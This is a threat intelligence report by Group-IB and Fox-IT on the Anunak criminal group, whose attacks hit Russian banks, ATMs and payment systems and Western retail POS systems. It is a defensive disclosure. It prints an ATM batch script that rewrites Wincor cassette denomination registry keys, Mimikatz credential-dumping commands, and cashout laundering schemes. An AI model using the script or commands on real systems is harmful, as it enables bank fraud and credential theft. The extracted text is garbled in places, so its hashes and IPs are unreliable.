{
    "title": "Anunak_APT_against_financial_institutions",
    "text": "AnunAk: \nAPT A gAins T finAnciAl \nins TiTuTionsGroup-IB and Fox-IT2\nDiscl Aimer\nHereby Group-IB and Fox-IT inform that:\n1. This report was prepared to provide infor -\nmation obtained as a result of Group-IB and \nFox-IT research.\n2. Description of threat technical details in this Report is given only to bring the appropriate information to the attention of information se -\ncurity specialists. It helps to prevent informa -\ntion security incidents and to minimize risks by creating awareness on the trend described in this report. The threat technical details published in this report in any case are not for the promotion of fraud and/or other illegal activities in the financial industry, high tech industry and/or other areas.\n3. The information published in this report may be used by interested parties at their discretion provided they make reference to Group-IB and Fox-IT.\nexecuTive summAry\nThis report describes the details and type of op -\nerations carried out by an organized criminal group that focuses on financial industry, such as banks and payment providers, retail industry and news, media and PR companies. The group has its origin in more common financial fraud including theft from con -\nsumer and corporate bank accounts in Europe and Russia, using standard banking malware, mainly Carberp.\nAfter the arrests of Carberp group members in \nRussia, some of the members were out of work, however, their experience gained from many years of crime has allowed them to enter a new niche. One of the members quickly realized that they can steal $2000 a thousand times, and earn $2 million, but also they can steal it in one time and immediately get it with much less effort. The anti-fraud measures employed by banks has pushed the criminals to search for new ways to make money with less bar -\nriers, compromising and modifying or taking data from banks, payment providers, retail and media/PR companies are some of these methods.\nFrom 2013 an organized criminal group intensi-\nfied its activity focused on banks and electronic pay -\nment systems in Russia and in the post-Soviet space. The key is that fraud occurs within the corporate network using internal payment gateways and in -\nternal banking systems. Thus money is stolen from the banks and payment systems, and not from their customers. While this is their main and most lucra -\ntive activity, the gang has also ventured into other areas including the compromise of media groups and other organizations for industrial espionage and likely a trading advantage on the stock market. In cases where the group got access to the government agency networks their aim was espionage related.\nThe organized criminal group backbone are \ncitizens of both Russian and Ukrainian origin, but the group also sources a number of mainstream and specialized services from individuals and groups originating from Russia, Ukraine and Belarus.\nThe average sum of theft in the Russian terri -\ntory and in the post-Soviet space is $2 million per incident. Since 2013 they have successfully gained access to networks of more than 50 Russian banks and 5 payment systems, and 2 of these institutions were deprived of their banking license. To date the total amount of theft is over 1 billion rubles (about 25 million dollars), most of it has been stolen in the second half of 2014.\nThe average time from the moment of penetration \ninto the financial institutions internal network till successful theft is 42 days.\nAs a result of access to internal bank networks \nthe attackers also managed to gain access to ATM management infrastructure and infect those sys -\ntems with their own malicious software that further allows theft from the banks ATM systems on the attackers command.\nSince 2014 the organized criminal group mem -\nbers began actively taking an interest in US and Eu -\nropean based retail organizations. While they were already familiar with POS malware and compromis -\ning POS terminals, the widespread media attention around the Target breach and other related breaches were the reason for this move. While the scale of breaches in this industry is still relatively low, with at least 3 successful card breaches and over a dozen retailers compromised this activity is quickly becom -\ning a lucrative endeavor for this group.\nTo penetrate into the internal networks this \norganized criminal group employs targeted emailing (spear phishing) and infections sources from other botnets. This is the main reason why the group is 3\nkeeping in touch with owners of large botnets. Since \nAugust 2014 the group began to create their own large botnet using a mass emailing, but not using typical exploit driveby infections. This last move is likely to reduce the need for external contacts.\nATTA cks in russiA\nThe first successful bank robbery was committed \nby this group in January 2013. In all first cases the attackers used the program RDPdoor for remote \naccess to the bank network and the program “MBR \nEraser” to remove traces and to crack Windows computers and servers. Both programs were used by \nthe members of the Carberp criminal group under \nthe guidance of a person named Germes. To reduce \nthe risk of losing access to the internal bank network \nthe attackers, in addition to malicious programs, were also used for remote access legitimate pro -\ngrams such as Ammy Admin and Team Viewer. Lat -\ner the attackers completely abandoned from usage of RDPdoor and Team Viewer.\nIn addition to banking and payment systems, \nhackers got access to e-mail servers to control all \ninternal communications. This approach allowed \nthem to find out that the anomalous activity in the bank network was identified, what technique was used to identify this activity and what measures the \nbank employees took to solve the problem. Email \ncontrol was successfully installed regardless of used \nemail system, MS Exchange or Lotus. This approach allowed them to take countermeasures that created for bank and payment system employees the feeling \nthat the problem had been solved.\nThe main steps of the attack progression are the \nfollowing ones:\n1. Primary infection of an ordinary employee \ncomputer.\n2. Getting a password of a user with administra -\ntive rights on some computers. For example, a password of a technical support engineer. \n3. Gaining legitimate access to one server.\n4. Compromising the domain administrator password from the server.\n5. Gaining access to the domain controller and compromising of all active domain accounts.6. Gaining access to e-mail and workflow servers.\n7. Gaining access to server and banking system \nadministrator workstations.\n8. Installing the software to monitor activity of \ninteresting system operators. Usually photo and video recording was used.\n9. Configuring remote access to servers of inter -\nest including firewall configuration changes.\nTools for a TTack\nTo carry out target attacks in 2014 the hackers \nhave finalized development of their core malware Anunak that is used along with the following tools:\nProgram Purpose of use\nMimikatzto get passwords from local and \ndomain accounts\nMBr Eraser to crack operating systems\nsoftPerfect Network scannerto scan laN\ncain & abel to get passwords\nssHD backdoorto get passwords and remote access\nammy admin for remote control\nTeam Viewer for remote control\nAccording to our laboratory classification the \nmain malware is “Anunak”. This trojan is used for \ntarget attacks only, mainly on banks and payment \nsystems. Target usage of this program allows it to \nremain poorly explored, providing it a good surviv -\nability inside corporate networks. The source code of the bank trojan program Carberp was used in some \nplaces of this malware. “Anunak” has the following feature set:\n• The software called “Mimikatz” is built in this \nprogram. This is an open source software that al -\nlows to obtain passwords of user accounts logged in the Windows system. However, this software was considerably changed: while maintaining the \ncapability to get account passwords the functions \nof user interaction and of information output for \nerrors and program execution were eliminated. \nThus, when the malicious program is executed on the server, it will secretly compromise all the 4\ndomain and local accounts, including adminis -\ntrator accounts. To get account passwords it is \nsufficient to enter two commands in succession: “privilege::debug” and “sekurlsa::logonpass -\nwords”. When this program is executed on a domain controller or an e-mail server it compro -\nmises virtually all the domain accounts, includ -\ning administrators.\n• There is also the possibility to add a file into the firewall exclusion list by creating the correspond -\ning rule with the utility “Netsh”.\n• The functions of keypress grabber as well as the \nfunction of screenshot creation are implemented \nin the program.\n• There are also the functions to interact with the \nbank system iFOBS.\n• The malware sends key information, screenshots and CAB-archives to its management server.\n• The program is able to secretly make changes to a number of system files, presumably to remove the limitations of Microsoft Windows desktop operating systems on the number of users that may simultaneously connect to the correspond -\ning PC using RDP to administer it remotely.\nThere is the ability to download arbitrary exe -\ncutable files from the management server and run them. One of these files is the program “AmmyAd -\nmin” that may be run with the arguments “-service” and “-nogui” that force it to start as a service without user interface. “AmmyAdmin” allows to connect with another computer that has the same software through the server “rl.ammyy.com” using the IP address and the unique identifier. As a result, the attacker gets remote access to the user computer with the running program “AmmyAdmin” bypassing firewalls. The window screenshot is shown in the figure below: \nWhen the attackers gain access to servers running \noperating systems of the Linux family they use SSH backdoor that transmits to the malicious server the login/password data used to access the servers and provides attackers remote access to the servers.\nTo provide access to the server of interest the at -\ntackers may appropriately modify rules for firewalls Microsoft TMG, CISCO, etc.\nWhen the attackers yet had no major malware \nthat would secretly install the program “AmmyAd -\nmin” and report to the attackers a remote access password, they used a malicious program known as “Barus”. This malware is used rarely and the last time we met it in 2013. This malicious program is developed by Russian-speaking authors. In the control panel you can notice a field “Ammy ID”, its usage allowed the attackers to connect remotely.\n5\nmeThoDs of mAlw Are \nDisTribuTion\nAt the very beginning of their activity in 2013 due \nto lack of the target Trojan the attackers began to \ndistribute Andromeda and Pony. They distributed these malware using Driveby through a bunch of Neutrino Exploit Kit exploits as shown in the figure below. It is interesting that in the autumn 2013 they used the site http://php.net/ as traffic source to Magnitude EK. They redirected the traffic from this resource since July 2013, but this fact was discov -\nered much later. The name of one of the streams to distribute the malware is “LOL BANK FUCKIUNG” that corresponded to the attacker activities.\nParallel to this technique they also use another \ninfection method, which was one of the principal methods. The main method of distribution is send -\ning emails with malicious attachments on behalf of the Central Bank of the Russian Federation, a poten -\ntial client or an real counterparty (at first the attack -\ners had cracked this counterparty account, then they used emailing with the cracked contact list).\nAnother used method is to install a special \nmalware to carry out targeted attacks via another malware that might appear in the local network by accident. To find such malicious programs the criminal group keeps in touch with several owners of large botnets that massively distributes their mal -ware. The attackers buy from these botnet owners the information about IP-addresses of computers where the botnet owners have installed malware and then check whether the IP-address belongs to the financial and government institutions. If the mal -\nware is in the subnet of interest, the attackers pay the large botnet owner for installation of their target malware. Such partner relations were established with owners of botnets Zeus, Shiz Ranbyus. All of these trojans are bank Trojans, their usage is ex -\nplained by the previously established relationships. In late 2013 the hacker under the alias Dinhold be -\ngan to build his own botnet using modified Carberp, having uploaded its source code for public access. The attackers were trying to create similar relations with this hacker, but in 2014 he was arrested, having not developed his botnet up to the required level.\nTo check whether the IP-address belongs to the \ndesired network the following script is used:\n#!/usr/bin/python# -*- coding: utf-8 -*-import osfrom bulkwhois.shadowserver import BulkWhoisshadow-\nserver\niplist_file = ‘ip.txt’path = os.path.dirname(os.path.abspath(__file__))bulk_whois = BulkWhoisshadowserver()iplist = []with open(os.path.join(path, iplist_file)) as f:   for line in f:\n6\n       iplist.append(line.strip())\nresult = bulk_whois.lookup_ip-\ns(iplist)\nwith open(os.path.join(path, ‘data.\ntxt’), ‘a’) as f:\n   for record in result:       f.write(‘IP: %s\\cc: %s\\org. Name: %s\\register: %s\\\nas Name: %s\\BGP Prefix: %s\\----------------------------------------\\‘ % (result[record][‘ip’], result[re -\ncord][‘cc’], result[record][‘org_name’], result[record][‘register’], result[record][‘as_name’], result[re -\ncord][‘bgp_prefix’]))\nThe most dangerous emailings \nare those that are sent on behalf of partners with whom financial and government institutions communicates permanently by email. An example of such emailing occurred on Septem -\nber 25, 2014, at 14:11, from the e-mail address “Elina Shchekina <e.shekina@rbkmoney.com>” with the subject “Updated agree -\nment version”. The attachment “agreement.doc” exploits the vul -\nnerability CVE-2012-2539 and CVE-2012-0158. The emailing \n7\nwas conducted for more than \n70 addresses of various compa -\nnies (where multiple recipient addresses may be within one company). \nThe letter with malicious \nattachment (\nmd5: AA36BA9F -\n4DE5892F1DD427B7B2100B06 ) \nin the archive with a password from a potential client was sent to a bank manager after a pre -\nliminary telephone conversation \nwith him. The call origin is Saint \nPetersburg. \nContents of a text file named \n“реквизиты.doc” (partner de -\ntais.doc)\n“Company our Century”, Ltd.\n109387 , russia, Moscow,\nanosov str., 24, office 409\nTel. (495) 124-99-77  Fax: (495)124-99-77\nMobile (962) 7135296\nE-mail: x60x@nxt. ruInn 7329001307  Kpp 732901001account 40702810613310001709\nBranch of VTB 24 (JSC), Moscow\nCorrespondent account 30101810700000000955\nBIC 043602955\nA letter on behalf of the \nCentral Bank of Russia with \na malicious attachment (md5: 8FA296EFAF87FF4D -\n9179283D42372C52) exploited the vulnerability CVE-2012-2539 in order to execute arbi -\ntrary code.\nThere were also other exam -\nples of emails with malicious \nattachments, such as emailing \nwith the file “001. photo.exe”.\nA more detailed list of such \nattachments you can see in the Table “Email attachments”.\n8\nATm ATTA cks\nAvailability of access to bank internal networks \nopens great opportunities for the hackers. One of \nthese opportunities is access to ATMs from spe -\ncial network segments that had to be isolated. It is confirmed that this criminal group gained access to 52 ATMs. The amount of damage exceeds 50 million rubles. As a result of access to ATMs, depending on the ATM model, hackers used different patterns. \nс h a n g e  \nd e n o m i n at i o n  o f\nw i t h d r awa l\nb a n k n o t e s\nHaving access, the attackers downloaded mali -\ncious scripts and changed denominations of issued banknotes in the ATM operating system registry. As a result, for query to get 10 notes with denomination of 100 roubles the attackers received 10 banknotes with denomination of 5,000 roubles. The used malicious script and program were developed for the platform Wincor.\nThe malicious script contains the following \ncommands:Contents of the file “1.bat” \nrEG aDD “HkEY_local_MacHINE\\sofTW arE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\l YNX-\nPar\\casH_DIsPENsEr” /v V alUE_1 /t rEG_sZ \n/d “5000” /f\nrEG aDD “HkEY_local_MacHINE\\sofTW arE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\l YNX-\nPar\\casH_DIsPENsEr” /v V alUE_2 /t rEG_sZ \n/d “1000” /frEG aDD “HkEY_local_MacHINE\\sofTW arE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\l YNX-\nPar\\casH_DIsPENsEr” /v V alUE_3 /t rEG_sZ \n/d “500” /f\nrEG aDD “HkEY_local_MacHINE\\sofTW arE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\l YNX-\nPar\\casH_DIsPENsEr” /v V alUE_4 /t rEG_sZ \n/d “100” /f\nrEG aDD “HkEY_local_MacHINE\\sofTW arE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\l YNX-\nPar\\casH_DIsPENsEr” /v V alUE_1 /t rEG_sZ \n/d “100” /f\nrEG aDD “HkEY_local_MacHINE\\sofTW arE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\l YNX-\nPar\\casH_DIsPENsEr” /v V alUE_4 /t rEG_sZ \n/d “5000” /f\nshutdown -r -t 0 –f\nFigure. Service program KDIAG32 for Wincor ATMs9\nExecution of this file changed registry keys in \nthe registry branch ““HKEY_LOCAL_MACHINE\\\nSOFTWARE\\Wincor Nixdorf\\ProTopas\\Current -\nVersion\\LYNXPAR\\CASH_DISPENSER”” that are responsible for cassette denominations in an ATM. As a result of this file execution the registry key that is in charge of the cassette number 1 (VALUE_1) is takes the value “100”, and the registry key respon -\nsible for the cassette number 4 (VALUE_4) is set to “5000”. Then the command to restart the computer is issued. The registry key reference values:\nregistry key name Value\nValUE_1 5000\nValUE_2 1000\nValUE_3 500\nValUE_4 100\nIf the ATM actual load corresponds to the refer -\nence one and registry keys have been changed, then the banknotes from the cassette No.1 will be issued with denomination “5000” instead of “100”.\nw i t h d r awa l  o f a l l c a s h  \nf r o m  d i s p e n s e r  \nIn addition, the attackers used a modified debug program that allows by the command to issue mon -\ney from the dispenser. The original debug program issues money through the dispenser only when the open ATM housing and the vault door are fixed. \nIn order to ensure money issuance from the \nclosed ATM the attackers had to modify the original program “KDIAG32” (the original file: size of 1,128,960 MD5 4CC1A6E049942EB -\nDA395244C74179EFF). \nfile Name size, bytes MD5 hash\na0064575.\nexe1 1 28 96049c708aaD19596cca380fD02aB036EB2\nA comparison of the original version of the pro -\ngram with the modified version showed that the only \ndifference is in ignoring error ““Door not opened or missing!””. The figure below shows an error message that will be never displayed to the user in the file under investigation. \nAnDromeDA  usA ge\nAll traces found during investigation of one incident showed that the same criminal group had worked. Ammy Admin was used for remote access, the same \n Figure. Hidden window in the original program KDIAG3210\nSSHD backdoor was installed \non Unix servers and, In addi-tion, it was loaded from the same hacked server as in other cases of trojan Anunak usage. However, in this case Androm -\neda is used as the main trojan instead of Anunak. The man-agement servers were located in Kazakhstan, Germany and Ukraine. Check of the manage -\nment servers showed that it was the hosting Bulletproof that, in \naddition to servers, provides \na service of traffic proxying through its infrastructure as \nwell as TOR and VPN usage, \nso this pattern is significantly \ndiffers from the Anunak host -\ning patern. Check of money cashout showed \nthat the same cashout criminal group had worked \nas for Anunak and this fact again confirmed their \ncooperation.\nObtained Andromeda trojan copies were being \ndistributed from August 2014 by e-mail. The value \n754037e7be8f61cbb1b85ab46c7da77d, which is the MD5 hash of the string “go fuck yourself”, was used as the RC4 encryption key. As a result of this distri -\nbution from August to late October the Andromeda botnet rose up to 260,000 bots. Successful infection in one subnet resulted in sending such letters to other bank employees. Example of forwarding from an infected bank network to employees of another bank is shown below. \nAs a result of this radial mailing many oil and gas \ncompanies, banks and government agencies were in -\nfected. In Russia at least 15 banks and two payment \nsystems were infected this way. \nLetters with similar attachments were being dis -\ntributed with the following subjects:\n“My new photo”\n“Alert Transactions Report by users from 2014-\n09-28 to 2014-09-28”\ncAshouT  \nschemA s\nPreviously, it should be noted the fact that the \nprocess of stolen money withdrawal (cashout) was differed, firstly by the theft method, secondly by the victim type (a bank or a payment system), thirdly by the total stolen sum. \nThe victims by their type were divided rather by \ncounterparty types and by limitations imposed by operation with the counterparties. For example, all payments were required to go through a certain pool of mediators. In addition, the “improper” pool of counterparties could cause suspicion and unneces -\nsary testing (manual processing of payment orders).\nBank (amounts up to 100 million roubles):\n• When the attackers had obtained control of a \nbank operator workstation (attacker purpose), \nthey in general used a classic tree scheme when \nfunds from the bank account were sent to several \nlegal entities, then from each legal entity to \nsmaller legal entities (may be several such iter -\nations) and then to private person credit cards \n(from 600 to 7000 transactions).\n• When the attackers had obtained control of ATM \nmanagement service (attacker purpose), money were withdrawn directly from the ATM by the at -\ntacker command. In this case the whole cashout process consisted in that a drop person had to be near the ATM at the specified time with a bag to empty the dispenser.\nBank (amounts from 100 million roubles):\n• Money was sent to accounts of other banks, and cracked banks were often used where accounts and credit cards had been prepared in advance.\nPayment system:\n• In addition to all the above methods, cash sending channels were also employed through the settlements systems, electronic wallets and payment systems, such as web money, Yandex \n11\nMoney, QIWI (1500-2000 transactions). Reve -\nnues of large amounts (up to 50 million roubles) \nwere recorded to particular cards of private per -\nsons who then used these cards to buy expensive small-sized goods such as jewelry, watches, and other attributes. A huge part of the money was sent through mobile operators (1500-2000 SIM cards prepared in advance).\n• In spring 2014 (high time of this fraud type) 2 \ncashout person groups were known who support -\ned target attacks, by autumn 2014 their number increased to 5. In general, this increase was due \nto number of thefts too (number of victims + average stolen sum per 1 victim). The groups are working in different cities to ensure better cashout distribution. Also these groups include immigrants from former Soviet republics who if necessary arrive in the required city. Each group was monitored by a separate person. Each group consists of about 15-20 people.\n• Part of the money was transferred to Ukraine and Belarus.\nmAlw Are sAmPles\na n u n a k\nMD5 file name c&c domain c&c IP\nD1DE522652E1 29c377591 58c1 4D48795 ntxobj.exe blizko.net 31. 131. 17. 125\nc687867E2c92448992c0fD00a2468752 ntxobj.exe blizko.org 31. 131. 17. 125\na1979aa1 59E0c542 1 2 1 22fD8acB24383 spoolsv.exe update-java.net 1 46.1 85.220.200\n0aD4892EaD67E65Ec3DD4c978fcE7D92 ZwGukEMphiZgNT.com great-codes.com 1 88.1 38.16.2 1 4\nmind-finder.com 1 88.1 38.16.2 1 4\ncc294f8727aDDc5D363BB23E10BE4af2 svchost.exe adguard.name 5.199.169.1 88\ncc294f8727aDDc5D363BB23E10BE4af2 d.exe adguard.name 1 46.1 85.220.97\ncc294f8727aDDc5D363BB23E10BE4af2 a0050236.exe adguard.name 5.199.169.1 88\nac5D3fc9Da1 2255759a4a7E4EB3D63E7 svchost.exe adguard.name 5.199.169.1 88\ncomixed.org 91.194.254.90\ntraider-pro.com 91.194.254.94\n5.1.83.1 332 16.170.1 17.88\n10.7 4.5.100\nfc6D9f538cDaE19c8c3c662E890af979 Dc1.exe public-dns.us 37.235.54.48\nfc6D9f538cDaE19c8c3c662E890af979 Dc1.exe public-dns.us 1 46.1 85.220.200\nfc6D9f538cDaE19c8c3c662E890af979 Dc1.exe freemsk-dns.com 1 46.1 85.220.200\n3dc8c4af5 1c8c367fbe7c7feef4f67 44 1 85.10.56.59\n3e90bf845922cf1bf5305e6fdcc1 4e46 worldnewsonline.pw 5.101.1 46.1 84\n1f80a57a3b99eeb8016339991a27593f coNTracT.doc financialnewsonline.pw 1 85.10.58.175\nb63af72039e4fb2acd0440b03268b404 QWcQa woI.exe great-codes.com 1 88.1 38.16.2 1 4\nmind-finder.com 1 88.1 38.16.2 1 4\nveslike.com 65.19.1 41.199\npublics-dns.com 91.194.254.94\n09c863 1c2ba7 4a92defb3 1040fe2c45a QWcQa woI.exe coral-trevel.com 87.98.1 53.34\n9d7 1 8e86cacffa39edafbf9c1ebc9754 oplata.scr paradise-plaza.com 91.194.254.9312\nm i m i k at z\nMD5 file name\n5D1aE2391DfB02E57333 1B3946f0c3 1 4 mimi.exe\n8DD7837 1B2D178fB8c8a9B101 2D7E985 m86.exe\n8646E3D8ffffE854D5f91 45c0aB41 3f6 00019114\nE464D4804D36fDDf0287877D66D5037a 00030724\nDE9f4cBB90c994522553aB40ac2D5409 00032800\nE9fc0f53c7c0223DE20f1776c53D3673 a0049585.exe\na4B053D9Ec7D5EDB207c208BfBE396Ec a0050233.dll\n86BD7f72a495a22B22070c068B591Df8 a0050235.sys\n2B8 17BD8 195Dc7f56500f38a0c7 40cEf m.exe\na n d r o m e d a\nMD5 file name c&c domain c&c IP\n4cf26f8E2f6864c4a8aaa7f92E54E801 001. photo.exeddnservice10.ru/and/jopagate.php\nddnservice1 1.ru/and/jopagate.php1 44.76.2 1 5.2 19\nm b r_e r a s e r\nMD5 file name\n934E1055B17 1Df0D3E28BE983 1EB7770 MBr_Eraser.exe\ne m a i l  at ta c h m e n t s\nMD5 file name c&c domain\n8fa296Efaf87ff4D9179283D42372c52 Соответствие ФЗ-1 1 5 от 24.06.201 4г.doc_ cVE-201 2-2539\naa36Ba9f4DE5892f1DD427B7B2 100B06 реквизиты.doc.cpl (“partner details.doc.cpl”)cVE-201 2-01 58, \ncVE-201 2-2539\n4cf26f8E2f6864c4a8aaa7f92E54E801 001. photo.exe\n17984EB3926Bf99f0ccB367f4fBa1 2E3О изменении правил электронного взаимодействия.doc (“about changes of electronic interaction rules.doc”)cVE-201 2-01 58\n94666Bca3fE8 1 83 1a23f60c407840408Об особенностях организации и проведения проверок кре-дитных организаций.doc (“ about peculiarities of organizing and \nconducting inspections of credit institutions.doc”)cVE-201 2-01 5813\nATTA cks in euroPe AnD  usA\nWhile the attacks in Russia against banks and \npayment systems have occurred over the past two \nyears, the attacks against the retail industry is only something which started in the second quarter of 2014. With at least three confirmed breaches where card track data was obtainedand a total of at least 16 breaches at retail organizations, it is also becoming a serious threat.\nApart from retail organizations it is also known \nthat a number of media and PR companies have been breached in 2014. While it is not entirely cer -\ntain, the type of breaches suggest that the attackers are looking for inside information, a type of indus -\ntrial espionage, allowing them to gain an advantage \non the stock market. As there is nothing specifically \nmissing and the resulting fraud is hard to match with anything, these incidents typically are never \nlinked.\nretailMedia/Pr/\nMarketing\nUsa 12 3\naustralia 2 0\nspain 1 0\nItaly 1 0\nTable: Overview of compromises per region and \nsector.\ni n f e c t i o n  m e t h o d s  \nFrom the retail perspective, the first infections in \n2014 were sourced from a botnet which employs a \nwidely deployed crypto-currency mining malware based on the Gozi/ISFB (banking) malware family. Based on our insights we believe during the first half of 2014 over half a million systems had been compromised by this malware from over the whole world, however Russia and a number of post-Soviet states were clean of infections. To find interesting infections within this large set of compromised systems, the malware extracts relevant information from the systems including Microsoft Windows organization registration information and network/Windows domain information.\nThe Gozi/ISFB based malware was used to drop \nadditional components on interesting systems, which included Metasploit/Meterpreter payloads and Anunak variants. This was one of the main methods for the group using Anunak to obtain in -\nteresting infections in the middle of 2014, sourcing \ninfections from other botnet operators.More recent -\nly other infection methods, including spear phishing \nusing English language and possibly also usage of \nthe teams own Andromeda, but also SQL injection to breach an organization directly from the outside, \nhas been employed by this team.\np o s c o m p r o m i s e s\nThe first known attacks with Anunak targeted \na specific brand of POS systems which revolved \naround the Epicor/NSB brand. To do this Anunak has specific code to target POS devices equipped with this software, which in contrary to the more common memory scanning track data scrapers, logs a wealth of information from the payments done by the cards. The first case this was seen active was in July 2014, but it might have been earlier as well.\nMore recent breaches have used a new custom \ndeveloped POS malware, which is a more simple but reliable track data memory scraper. The initial version from the early fall of 2014 used a simple blacklist, scraped every process and dumped track data in plain text. More recent versions scanned only configuration specified processes and used RC4 to encrypt the extracted track data records on disk.\na d d i t i o n a l  ta r g e t s\nWhile the retail industry is one of its main targets \ndue to its payment processing capabilities, other compromises might occur indirectly, for example to obtain databases with information or other informa -\ntion that is of value to the organized criminal group. One of the possibilities is obtaining lists of corporate email addresses to have a higher chance of interest -\ning infections.\nAt this moment we have no evidence of successful \ncompromise or theft of banks and payment systems outside of Russia, but several infections in the east of Europe (specifically Ukraine and Latvia) were active in 2014. These specific infections were related to infrastructure of organizations based in Russia or with significant interests in Russia, thus more likely related to the breaches at the same organization in Russia.\nThe majority of infections from Europe were from \ndedicated servers used as exit node for VPN services, 14\nthe systems infected were likely from Eastern Euro -\npean or Russian origin, and possibly test infections \nfrom the attackers. We have no evidence of compro -\nmises against banks in Western Europe or United States, but it should be noted that the attackers methods could be utilized against banks outside of Russia as well.\nm e t h o d s  o f l at e r a l  m o v e m e n t  \na n d p e r s i s t e n c e\nThe group uses Metasploit as one of their main \nhacking tools, either stand alone or as part of a framework. The activity includes port scanning and system reconnaissance, escalating privileges on systems by using for example the recent CVE-2014-4113 vulnerability, gathering credentials and hop -\nping on to other systems and networks. Metasploit is being used to its full potential with scanning, exploiting, privilege escalation and post exploitation persistence being achieved with its standard toolset.\nOn interesting and critical systems typical hack -\ning tools might be found to establish tunnels out of the network, either tools that are part of the Metasploit framework such as Meterpreter, but also other tools to achieve persistence on those systems. The connect back methods seen are typically SSL over port 443, but also DNS based methods were observed. The attackers use BITS to download files, but also make use of Windows built-in PowerShell to download tools and execute commands. Finally on the critical systems freshly crypted and non-detected versions of Anunak are deployed, typically these are used in very limited deployments thus their spread is limited and detection by Anti-Virus is very rare.\nVarious stealth methods including the aforemen -\ntioned backconnect SSL and DNS tunneling for compromise persistence and data exfiltration are used. The Anunak malware has multiple ways of connecting to backends, which includes a PHP based backend reachable over HTTP and HTTPS, and a Windows server based component using a propri -\netary protocol.\nThe use of VNC scanning and password brute \nforcing, the adding of additional administrator accounts, use of RDP Wrapper to allow concurrent \nRDP sessions are all methods to gain access and \nachieve persistent access to compromised systems employed by this group. Additionally various ways \nof creating incidental and regular screen captures \nof the desktop of persons of interest within com -promised organizations were methods employed by \nthese attackers. This also includes video captures \nmade by the Anunak malware, allowing attackers to \nobserve the behavior of users of certain applications.\nAbouT  us\ng r o u p -i b\nGroup-IB is one of the leading international \ncompanies specializing in preventing and investigat -\ning high-tech cyber crimes and fraud. The company \noffers a range of services on preventing financial and reputational damages, consulting and auditing \nof information security systems, and on computer \nforensics. The company also develops a number of \ninnovative software products used to monitor, detect and prevent emerging cyber threats.\nThe Group-IB team is made up of experts with \nunique skills and solid practical experience. They are internationally certified by CISSP, CISA, CISM, CEH, CWSP, GCFA and also have information security state certificates. In 2013, computer secu -\nrity incident response team CERT-GIB operated by Group-IB became a member of FIRST — Forum of Incident Response and Security Teams.\nIn 2013, the company became a member of the \ninternational cyber security alliance IMPACT (In -\nternational Multilateral Partnership Against Cyber Threats).\nwww.group-ib.com\nf o x-i t\nFox-IT creates innovative cyber security solutions \nfor a more secure society. We are dedicated to our \nclients, our values, and our integrity. Fox-IT delivers solutions before, during and after attacks. InTELL is the real-time cyber intelligence product from Fox-IT. It provides a layered intelligence approach: actionable data feeds into operational risk decision systems. Real time threat information allows for tactical decisions and mitigation. InTELL provides a full real-time insight in the global threat landscape. We base our intelligence around actor attribu -\ntion. This angle drives a unique visibility on online threats — InTELL sees threats before they enter the botnet. Information is delivered through our col -\nlaboration portal, alerting, and through automated feeds powered by industry standard transports.\nwww.fox-it.com"
}